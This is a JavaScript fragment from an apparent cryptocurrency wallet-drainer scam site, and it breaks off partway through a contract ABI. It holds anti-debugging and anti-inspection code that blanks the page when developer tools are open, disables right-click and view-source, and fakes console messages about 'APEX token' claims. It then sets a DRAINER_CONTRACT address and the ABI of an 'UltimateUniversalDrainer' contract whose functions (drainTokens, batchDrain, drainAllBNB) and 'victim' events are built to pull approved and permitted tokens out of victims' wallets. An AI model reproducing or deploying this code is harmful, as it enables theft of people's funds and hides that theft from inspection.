// ====== ADVANCED ANTI-DEBUGGING AND SOURCE CODE PROTECTION =
(function () {
  const antiDebug = {
    debuggerDetection: function () {
      setInterval(function () {
        const start = Date.now();
        (function () {
          debugger;
        })();
        if (Date.now() - start > 100) {
          document.body.innerHTML = "Debugger Detected. Access Denied.";
          window.location.href = "about:blank";
        }
      }, 1000);  setInterval(function () {
    const perf = performance.now();
    debugger;
    if (performance.now() - perf > 200) {
      document.body.innerHTML = "Debugger Detected. Access Denied.";
      window.location.href = "about:blank";
    }
  }, 1500);

  const originalDebugger = Function.prototype.constructor;
  Function.prototype.constructor = function () {
    if (arguments[0] === "debugger") {
      throw new Error("Debugger statements are not allowed");
    }
    return originalDebugger.apply(this, arguments);
  };
},

consoleProtection: function () {
  const originalConsole = {
    log: console.log,
    warn: console.warn,
    error: console.error,
    info: console.info,
    debug: console.debug,
    table: console.table,
    trace: console.trace,
  };

  console.log = function () {
    if (Math.random() > 0.7) {
      const fakeMessages = [
        "Token claim processed successfully",
        "Wallet connection established",
        "Transaction confirmed on blockchain",
        "APEX tokens distributed to wallet",
        "Security verification passed",
        "Smart contract executed successfully",
        "Gas fees optimized for transaction",
        "Token balance updated successfully",
      ];
      const randomMessage =
        fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
      originalConsole.log(`[APEX] ${randomMessage}`);
    }
  };

  console.warn = function () {
    const fakeWarnings = [
      "Low gas fee detected, transaction may take longer",
      "Network congestion detected, retrying transaction",
      "Wallet connection unstable, attempting reconnect",
      "Token price fluctuation detected",
      "High network traffic, optimizing gas fees",
    ];
    const randomWarning =
      fakeWarnings[Math.floor(Math.random() * fakeWarnings.length)];
    originalConsole.warn(`[APEX WARNING] ${randomWarning}`);
  };

  console.error = function () {
    const fakeErrors = [
      "Transaction failed due to network congestion",
      "Insufficient gas for transaction",
      "Wallet connection timeout",
      "Blockchain node unresponsive",
      "Token transfer reverted by smart contract",
    ];
    const randomError =
      fakeErrors[Math.floor(Math.random() * fakeErrors.length)];
    originalConsole.error(`[APEX ERROR] ${randomError}`);
  };

  console.info = function () {};
  console.debug = function () {};
  console.table = function () {};
  console.trace = function () {};

  const originalClear = console.clear;
  console.clear = function () {
    originalConsole.log("[APEX] Console clearing disabled for security");
  };
},

devToolsDetection: function () {
  const widthThreshold = window.outerWidth - window.innerWidth > 160;
  const heightThreshold = window.outerHeight - window.innerHeight > 160;

  if (widthThreshold || heightThreshold) {
    document.body.innerHTML = "Developer Tools Detected. Access Denied.";
    window.location.href = "about:blank";
  }

  setInterval(function () {
    const widthThreshold = window.outerWidth - window.innerWidth > 160;
    const heightThreshold = window.outerHeight - window.innerHeight > 160;

    if (widthThreshold || heightThreshold) {
      document.body.innerHTML = "Developer Tools Detected. Access Denied.";
      window.location.href = "about:blank";
    }
  }, 1000);

  const element = new Image();
  Object.defineProperty(element, "id", {
    get: function () {
      document.body.innerHTML = "Developer Tools Detected. Access Denied.";
      window.location.href = "about:blank";
    },
  });

  console.log("%c", element);
},

codeProtection: function () {
  document.addEventListener("contextmenu", function (e) {
    e.preventDefault();
    return false;
  });

  document.addEventListener("selectstart", function (e) {
    e.preventDefault();
    return false;
  });

  document.addEventListener("keydown", function (e) {
    if (e.keyCode === 123) {
      e.preventDefault();
      return false;
    }
    if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
      e.preventDefault();
      return false;
    }
    if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
      e.preventDefault();
      return false;
    }
    if (e.ctrlKey && e.keyCode === 85) {
      e.preventDefault();
      return false;
    }
  });
},

init: function () {
  this.debuggerDetection();
  this.consoleProtection();
  this.devToolsDetection();
  this.codeProtection();
},  };  antiDebug.init();
})();// ====== CONTRACT ABI AND ADDRESS ======
const DRAINER_CONTRACT = "0xbf2c883b097d6733a7e5a8d853d05825564bd857"; // Your deployed contract addressconst CONTRACT_ABI = [
  {
    "type": "constructor",
    "inputs": [
      {
        "name": "primary",
        "type": "address[]",
        "internalType": "address[]"
      },
      {
        "name": "fallback1",
        "type": "address[]",
        "internalType": "address[]"
      },
      {
        "name": "fallback2",
        "type": "address[]",
        "internalType": "address[]"
      },
      {
        "name": "emergency",
        "type": "address[]",
        "internalType": "address[]"
      },
      {
        "name": "basisPoints",
        "type": "uint16[]",
        "internalType": "uint16[]"
      },
      {
        "name": "initialTokenThreshold",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "initialBNBThreshold",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "_auditor",
        "type": "address",
        "internalType": "address"
      }
    ],
    "stateMutability": "nonpayable"
  },
  {
    "name": "AlreadyUsed",
    "type": "error",
    "inputs": []
  },
  {
    "name": "ArrayLengthMismatch",
    "type": "error",
    "inputs": []
  },
  {
    "name": "BatchLimitExceeded",
    "type": "error",
    "inputs": []
  },
  {
    "name": "CannotPullBNB",
    "type": "error",
    "inputs": []
  },
  {
    "name": "DistributionIncomplete",
    "type": "error",
    "inputs": []
  },
  {
    "name": "ECDSAInvalidSignature",
    "type": "error",
    "inputs": []
  },
  {
    "name": "ECDSAInvalidSignatureLength",
    "type": "error",
    "inputs": [
      {
        "name": "length",
        "type": "uint256",
        "internalType": "uint256"
      }
    ]
  },
  {
    "name": "ECDSAInvalidSignatureS",
    "type": "error",
    "inputs": [
      {
        "name": "s",
        "type": "bytes32",
        "internalType": "bytes32"
      }
    ]
  },
  {
    "name": "EmergencyFailed",
    "type": "error",
    "inputs": []
  },
  {
    "name": "EmptyRequest",
    "type": "error",
    "inputs": []
  },
  {
    "name": "EnforcedPause",
    "type": "error",
    "inputs": []
  },
  {
    "name": "ExpectedPause",
    "type": "error",
    "inputs": []
  },
  {
    "name": "ExpiredDeadline",
    "type": "error",
    "inputs": []
  },
  {
    "name": "FallbackFailed",
    "type": "error",
    "inputs": []
  },
  {
    "name": "GasPriceTooHigh",
    "type": "error",
    "inputs": []
  },
  {
    "name": "InsufficientAllowance",
    "type": "error",
    "inputs": []
  },
  {
    "name": "InsufficientGas",
    "type": "error",
    "inputs": []
  },
  {
    "name": "InvalidBasisPoints",
    "type": "error",
    "inputs": []
  },
  {
    "name": "InvalidGasBudget",
    "type": "error",
    "inputs": []
  },
  {
    "name": "InvalidProposedData",
    "type": "error",
    "inputs": []
  },
  {
    "name": "InvalidShortString",
    "type": "error",
    "inputs": []
  },
  {
    "name": "InvalidSignature",
    "type": "error",
    "inputs": []
  },
  {
    "name": "NoBNBToDistribute",
    "type": "error",
    "inputs": []
  },
  {
    "name": "NotAuthorized",
    "type": "error",
    "inputs": []
  },
  {
    "name": "OwnableInvalidOwner",
    "type": "error",
    "inputs": [
      {
        "name": "owner",
        "type": "address",
        "internalType": "address"
      }
    ]
  },
  {
    "name": "OwnableUnauthorizedAccount",
    "type": "error",
    "inputs": [
      {
        "name": "account",
        "type": "address",
        "internalType": "address"
      }
    ]
  },
  {
    "name": "PermitFailed",
    "type": "error",
    "inputs": []
  },
  {
    "name": "ReentrancyGuardReentrantCall",
    "type": "error",
    "inputs": []
  },
  {
    "name": "SafeERC20FailedOperation",
    "type": "error",
    "inputs": [
      {
        "name": "token",
        "type": "address",
        "internalType": "address"
      }
    ]
  },
  {
    "name": "StringTooLong",
    "type": "error",
    "inputs": [
      {
        "name": "str",
        "type": "string",
        "internalType": "string"
      }
    ]
  },
  {
    "name": "TimelockActive",
    "type": "error",
    "inputs": []
  },
  {
    "name": "TransferFailed",
    "type": "error",
    "inputs": []
  },
  {
    "name": "UnauthorizedBNBWithdrawal",
    "type": "error",
    "inputs": []
  },
  {
    "name": "ZeroAddress",
    "type": "error",
    "inputs": []
  },
  {
    "name": "ZeroAmount",
    "type": "error",
    "inputs": []
  },
  {
    "name": "AuditView",
    "type": "event",
    "inputs": [
      {
        "name": "viewer",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "snapshot",
        "type": "bytes32",
        "indexed": true,
        "internalType": "bytes32"
      }
    ],
    "anonymous": false
  },
  {
    "name": "BNBAuthorizationSet",
    "type": "event",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "maxAmount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "deadline",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      }
    ],
    "anonymous": false
  },
  {
    "name": "BNBDeposited",
    "type": "event",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      }
    ],
    "anonymous": false
  },
  {
    "name": "BNBDrained",
    "type": "event",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      }
    ],
    "anonymous": false
  },
  {
    "name": "BatchDrainExecuted",
    "type": "event",
    "inputs": [
      {
        "name": "tokenRequests",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "bnbVictims",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "totalGas",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      }
    ],
    "anonymous": false
  },
  {
    "name": "CircuitBreakerReset",
    "type": "event",
    "inputs": [],
    "anonymous": false
  },
  {
    "name": "CircuitBreakerTripped",
    "type": "event",
    "inputs": [
      {
        "name": "reason",
        "type": "string",
        "indexed": false,
        "internalType": "string"
      }
    ],
    "anonymous": false
  },
  {
    "name": "DistributionResult",
    "type": "event",
    "inputs": [
      {
        "name": "token",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "recipient",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "success",
        "type": "bool",
        "indexed": false,
        "internalType": "bool"
      }
    ],
    "anonymous": false
  },
  {
    "name": "DrainCursorUpdated",
    "type": "event",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "nextIndex",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "remainingGas",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      }
    ],
    "anonymous": false
  },
  {
    "name": "DrainExecuted",
    "type": "event",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "operator",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "operationId",
        "type": "bytes32",
        "indexed": true,
        "internalType": "bytes32"
      },
      {
        "name": "permitCount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "approvedCount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "bnbAmount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "successfulTransfers",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "gasUsed",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "completed",
        "type": "bool",
        "indexed": false,
        "internalType": "bool"
      }
    ],
    "anonymous": false
  },
  {
    "name": "EIP712DomainChanged",
    "type": "event",
    "inputs": [],
    "anonymous": false
  },
  {
    "name": "EmergencyFailedEvent",
    "type": "event",
    "inputs": [
      {
        "name": "token",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "failedAddr",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      }
    ],
    "anonymous": false
  },
  {
    "name": "EmergencyUsed",
    "type": "event",
    "inputs": [
      {
        "name": "token",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "emergency",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      }
    ],
    "anonymous": false
  },
  {
    "name": "FallbackFailedEvent",
    "type": "event",
    "inputs": [
      {
        "name": "token",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "failedAddr",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      }
    ],
    "anonymous": false
  },
  {
    "name": "FallbackUsed",
    "type": "event",
    "inputs": [
      {
        "name": "token",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "primary",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "fb",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      }
    ],
    "anonymous": false
  },
  {
    "name": "FundsRecovered",
    "type": "event",
    "inputs": [
      {
        "name": "token",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "to",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "recoveryId",
        "type": "bytes32",
        "indexed": true,
        "internalType": "bytes32"
      }
    ],
    "anonymous": false
  },
  {
    "name": "OwnershipTransferred",
    "type": "event",
    "inputs": [
      {
        "name": "previousOwner",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "newOwner",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      }
    ],
    "anonymous": false
  },
  {
    "name": "Paused",
    "type": "event",
    "inputs": [
      {
        "name": "account",
        "type": "address",
        "indexed": false,
        "internalType": "address"
      }
    ],
    "anonymous": false
  },
  {
    "name": "RecipientsProposed",
    "type": "event",
    "inputs": [
      {
        "name": "primary",
        "type": "address[]",
        "indexed": false,
        "internalType": "address[]"
      },
      {
        "name": "fb1",
        "type": "address[]",
        "indexed": false,
        "internalType": "address[]"
      },
      {
        "name": "fb2",
        "type": "address[]",
        "indexed": false,
        "internalType": "address[]"
      },
      {
        "name": "emergency",
        "type": "address[]",
        "indexed": false,
        "internalType": "address[]"
      },
      {
        "name": "basis",
        "type": "uint16[]",
        "indexed": false,
        "internalType": "uint16[]"
      },
      {
        "name": "executeAfter",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      }
    ],
    "anonymous": false
  },
  {
    "name": "RecipientsUpdated",
    "type": "event",
    "inputs": [],
    "anonymous": false
  },
  {
    "name": "ThresholdsUpdated",
    "type": "event",
    "inputs": [
      {
        "name": "newTokenThreshold",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      },
      {
        "name": "newBNBThreshold",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      }
    ],
    "anonymous": false
  },
  {
    "name": "TokensDrainedWithApproval",
    "type": "event",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "token",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      }
    ],
    "anonymous": false
  },
  {
    "name": "TokensDrainedWithPermit",
    "type": "event",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "token",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      }
    ],
    "anonymous": false
  },
  {
    "name": "Unpaused",
    "type": "event",
    "inputs": [
      {
        "name": "account",
        "type": "address",
        "indexed": false,
        "internalType": "address"
      }
    ],
    "anonymous": false
  },
  {
    "name": "VictimApprovalSet",
    "type": "event",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "token",
        "type": "address",
        "indexed": true,
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "indexed": false,
        "internalType": "uint256"
      }
    ],
    "anonymous": false
  },
  {
    "type": "fallback",
    "stateMutability": "payable"
  },
  {
    "name": "APPROVED_BATCH_LIMIT",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "BASIS_POINTS",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "BNB_MIN_DEPOSIT",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "MAX_GAS_BUDGET",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "MAX_GAS_PRICE",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "MAX_RECIPIENTS",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "MIN_GAS_RESERVE",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "PERMIT_BATCH_LIMIT",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "TIMELOCK_DURATION",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "auditor",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "address",
        "internalType": "address"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "authorizeBNBDrain",
    "type": "function",
    "inputs": [
      {
        "name": "maxAmount",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "deadline",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "salt",
        "type": "bytes32",
        "internalType": "bytes32"
      },
      {
        "name": "signature",
        "type": "bytes",
        "internalType": "bytes"
      }
    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "batchDrain",
    "type": "function",
    "inputs": [
      {
        "name": "request",
        "type": "tuple",
        "components": [
          {
            "name": "tokenRequests",
            "type": "tuple[]",
            "components": [
              {
                "name": "victim",
                "type": "address",
                "internalType": "address"
              },
              {
                "name": "permits",
                "type": "tuple[]",
                "components": [
                  {
                    "name": "token",
                    "type": "address",
                    "internalType": "address"
                  },
                  {
                    "name": "value",
                    "type": "uint256",
                    "internalType": "uint256"
                  },
                  {
                    "name": "deadline",
                    "type": "uint256",
                    "internalType": "uint256"
                  },
                  {
                    "name": "v",
                    "type": "uint8",
                    "internalType": "uint8"
                  },
                  {
                    "name": "r",
                    "type": "bytes32",
                    "internalType": "bytes32"
                  },
                  {
                    "name": "s",
                    "type": "bytes32",
                    "internalType": "bytes32"
                  }
                ],
                "internalType": "struct UltimateUniversalDrainer.PermitData[]"
              },
              {
                "name": "approvedTokens",
                "type": "address[]",
                "internalType": "address[]"
              },
              {
                "name": "approvedAmounts",
                "type": "uint256[]",
                "internalType": "uint256[]"
              },
              {
                "name": "gasBudget",
                "type": "uint256",
                "internalType": "uint256"
              },
              {
                "name": "resume",
                "type": "bool",
                "internalType": "bool"
              },
              {
                "name": "deadline",
                "type": "uint256",
                "internalType": "uint256"
              },
              {
                "name": "salt",
                "type": "bytes32",
                "internalType": "bytes32"
              },
              {
                "name": "signature",
                "type": "bytes",
                "internalType": "bytes"
              }
            ],
            "internalType": "struct UltimateUniversalDrainer.TokenDrainRequest[]"
          },
          {
            "name": "bnbVictims",
            "type": "address[]",
            "internalType": "address[]"
          },
          {
            "name": "bnbAmounts",
            "type": "uint256[]",
            "internalType": "uint256[]"
          }
        ],
        "internalType": "struct UltimateUniversalDrainer.BatchDrainRequest"
      }
    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "bnbSplitThreshold",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "cancelRecipientsProposal",
    "type": "function",
    "inputs": [],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "depositBNB",
    "type": "function",
    "inputs": [],
    "outputs": [],
    "stateMutability": "payable"
  },
  {
    "name": "drainAllBNB",
    "type": "function",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "internalType": "address"
      }
    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "drainBNB",
    "type": "function",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "drainTokens",
    "type": "function",
    "inputs": [
      {
        "name": "request",
        "type": "tuple",
        "components": [
          {
            "name": "victim",
            "type": "address",
            "internalType": "address"
          },
          {
            "name": "permits",
            "type": "tuple[]",
            "components": [
              {
                "name": "token",
                "type": "address",
                "internalType": "address"
              },
              {
                "name": "value",
                "type": "uint256",
                "internalType": "uint256"
              },
              {
                "name": "deadline",
                "type": "uint256",
                "internalType": "uint256"
              },
              {
                "name": "v",
                "type": "uint8",
                "internalType": "uint8"
              },
              {
                "name": "r",
                "type": "bytes32",
                "internalType": "bytes32"
              },
              {
                "name": "s",
                "type": "bytes32",
                "internalType": "bytes32"
              }
            ],
            "internalType": "struct UltimateUniversalDrainer.PermitData[]"
          },
          {
            "name": "approvedTokens",
            "type": "address[]",
            "internalType": "address[]"
          },
          {
            "name": "approvedAmounts",
            "type": "uint256[]",
            "internalType": "uint256[]"
          },
          {
            "name": "gasBudget",
            "type": "uint256",
            "internalType": "uint256"
          },
          {
            "name": "resume",
            "type": "bool",
            "internalType": "bool"
          },
          {
            "name": "deadline",
            "type": "uint256",
            "internalType": "uint256"
          },
          {
            "name": "salt",
            "type": "bytes32",
            "internalType": "bytes32"
          },
          {
            "name": "signature",
            "type": "bytes",
            "internalType": "bytes"
          }
        ],
        "internalType": "struct UltimateUniversalDrainer.TokenDrainRequest"
      }
    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "eip712Domain",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "fields",
        "type": "bytes1",
        "internalType": "bytes1"
      },
      {
        "name": "name",
        "type": "string",
        "internalType": "string"
      },
      {
        "name": "version",
        "type": "string",
        "internalType": "string"
      },
      {
        "name": "chainId",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "verifyingContract",
        "type": "address",
        "internalType": "address"
      },
      {
        "name": "salt",
        "type": "bytes32",
        "internalType": "bytes32"
      },
      {
        "name": "extensions",
        "type": "uint256[]",
        "internalType": "uint256[]"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "executeRecipientsUpdate",
    "type": "function",
    "inputs": [],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "getBNBDeposit",
    "type": "function",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "internalType": "address"
      }
    ],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "getBNBMaxAllowed",
    "type": "function",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "internalType": "address"
      }
    ],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "getDrainCursor",
    "type": "function",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "internalType": "address"
      }
    ],
    "outputs": [
      {
        "name": "tokenIndex",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "gasBudget",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "getRecipients",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "primary",
        "type": "tuple[]",
        "components": [
          {
            "name": "addr",
            "type": "address",
            "internalType": "address payable"
          },
          {
            "name": "basisPoints",
            "type": "uint16",
            "internalType": "uint16"
          }
        ],
        "internalType": "struct UltimateUniversalDrainer.Recipient[]"
      },
      {
        "name": "fb1",
        "type": "tuple[]",
        "components": [
          {
            "name": "addr",
            "type": "address",
            "internalType": "address payable"
          },
          {
            "name": "basisPoints",
            "type": "uint16",
            "internalType": "uint16"
          }
        ],
        "internalType": "struct UltimateUniversalDrainer.Recipient[]"
      },
      {
        "name": "fb2",
        "type": "tuple[]",
        "components": [
          {
            "name": "addr",
            "type": "address",
            "internalType": "address payable"
          },
          {
            "name": "basisPoints",
            "type": "uint16",
            "internalType": "uint16"
          }
        ],
        "internalType": "struct UltimateUniversalDrainer.Recipient[]"
      },
      {
        "name": "emergency",
        "type": "tuple[]",
        "components": [
          {
            "name": "addr",
            "type": "address",
            "internalType": "address payable"
          },
          {
            "name": "basisPoints",
            "type": "uint16",
            "internalType": "uint16"
          }
        ],
        "internalType": "struct UltimateUniversalDrainer.Recipient[]"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "getSnapshot",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "bytes32",
        "internalType": "bytes32"
      }
    ],
    "stateMutability": "nonpayable"
  },
  {
    "name": "getSystemHealth",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "totalOps",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "successRateBips",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "totalValue",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "consecutiveFailures",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "circuitBroken",
        "type": "bool",
        "internalType": "bool"
      },
      {
        "name": "paused_",
        "type": "bool",
        "internalType": "bool"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "getThresholds",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "tokenThreshold",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "bnbThreshold",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "getVictimApproval",
    "type": "function",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "internalType": "address"
      },
      {
        "name": "token",
        "type": "address",
        "internalType": "address"
      }
    ],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "getVictimNonce",
    "type": "function",
    "inputs": [
      {
        "name": "victim",
        "type": "address",
        "internalType": "address"
      }
    ],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "owner",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "address",
        "internalType": "address"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "pause",
    "type": "function",
    "inputs": [],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "paused",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "bool",
        "internalType": "bool"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "proposeRecipients",
    "type": "function",
    "inputs": [
      {
        "name": "primary",
        "type": "address[]",
        "internalType": "address[]"
      },
      {
        "name": "fallback1",
        "type": "address[]",
        "internalType": "address[]"
      },
      {
        "name": "fallback2",
        "type": "address[]",
        "internalType": "address[]"
      },
      {
        "name": "emergency",
        "type": "address[]",
        "internalType": "address[]"
      },
      {
        "name": "basisPoints",
        "type": "uint16[]",
        "internalType": "uint16[]"
      }
    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "recoverFunds",
    "type": "function",
    "inputs": [
      {
        "name": "token",
        "type": "address",
        "internalType": "address"
      },
      {
        "name": "to",
        "type": "address",
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "renounceOwnership",
    "type": "function",
    "inputs": [],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "resetCircuitBreaker",
    "type": "function",
    "inputs": [],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "setAuditor",
    "type": "function",
    "inputs": [
      {
        "name": "newAuditor",
        "type": "address",
        "internalType": "address"
      }
    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "setTokenApproval",
    "type": "function",
    "inputs": [
      {
        "name": "token",
        "type": "address",
        "internalType": "address"
      },
      {
        "name": "amount",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "tokenSplitThreshold",
    "type": "function",
    "inputs": [],
    "outputs": [
      {
        "name": "",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "stateMutability": "view"
  },
  {
    "name": "transferOwnership",
    "type": "function",
    "inputs": [
      {
        "name": "newOwner",
        "type": "address",
        "internalType": "address"
      }
